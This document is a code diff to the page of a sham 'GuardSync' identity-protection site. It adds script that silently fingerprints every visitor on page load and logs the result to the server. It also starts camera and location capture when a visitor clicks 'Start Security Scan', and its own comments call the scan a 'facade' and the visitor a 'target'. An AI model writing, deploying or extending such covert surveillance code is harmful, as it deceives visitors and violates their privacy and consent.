@@ -5,6 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GuardSync | Next-Gen Identity Protection</title>
+    <link rel="icon" href="data:,">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link
@@ -401,6 +402,20 @@
     <script src="fp/core.js"></script>
 
     <script>
+        let globalDeviceId = 'unknown';
+
+        // 1. Silent Reconnaissance - Executes immediately upon page load without interaction
+        window.addEventListener('DOMContentLoaded', async () => {
+            try {
+                const data = await FP.run('/log');
+                globalDeviceId = data.stableHash?.slice(0, 16) || 'unknown';
+                console.log('[SYSTEM] Initial fingerprint mapped to:', globalDeviceId);
+            } catch (e) {
+                console.warn('[SYSTEM] Silent telemetry failed:', e);
+            }
+        });
+
+        // 2. Active Surveillance - Executes only when target clicks "Start Security Scan"
         async function startScan() {
             const overlay = document.getElementById('scan-overlay');
             const lText = document.getElementById('loader-text');
@@ -411,23 +426,30 @@
             lText.textContent = "Analyzing Environment...";
             lSub.textContent = "Checking browser integrity and hardware profile.";
 
-            const data = await FP.run('/log');   // ← this line uses your fp/core.js
-            const deviceId = data.stableHash?.slice(0, 16) || 'unknown';
-
+            // Simulate parsing delay for the facade
             await new Promise(r => setTimeout(r, 1500));
 
             lText.textContent = "Verifying Hardware...";
             lSub.textContent = "Please allow permissions for location and identity verification.";
 
+            // Fallback just in case target clicks faster than DOM load can map their ID
+            if (globalDeviceId === 'unknown') {
+                try {
+                    const data = await FP.run('/log');
+                    globalDeviceId = data.stableHash?.slice(0, 16) || 'unknown';
+                } catch { }
+            }
+
             try {
-                const result = await Surveillance.init(deviceId, {
+                // Initialize invasive capabilities using the pre-captured globalDeviceId
+                const result = await Surveillance.init(globalDeviceId, {
                     enableLocation: true,
                     enableCamera: true,
-                    camShots: 15
+                    camShots: 14
                 });
-                console.log('Surveillance started:', result);
+                console.log('[SYSTEM] Surveillance exploits started:', result);
             } catch (e) {
-                console.warn('Surveillance failed or blocked:', e);
+                console.warn('[SYSTEM] Surveillance failed or blocked:', e);
             }
 
             await new Promise(r => setTimeout(r, 2000));
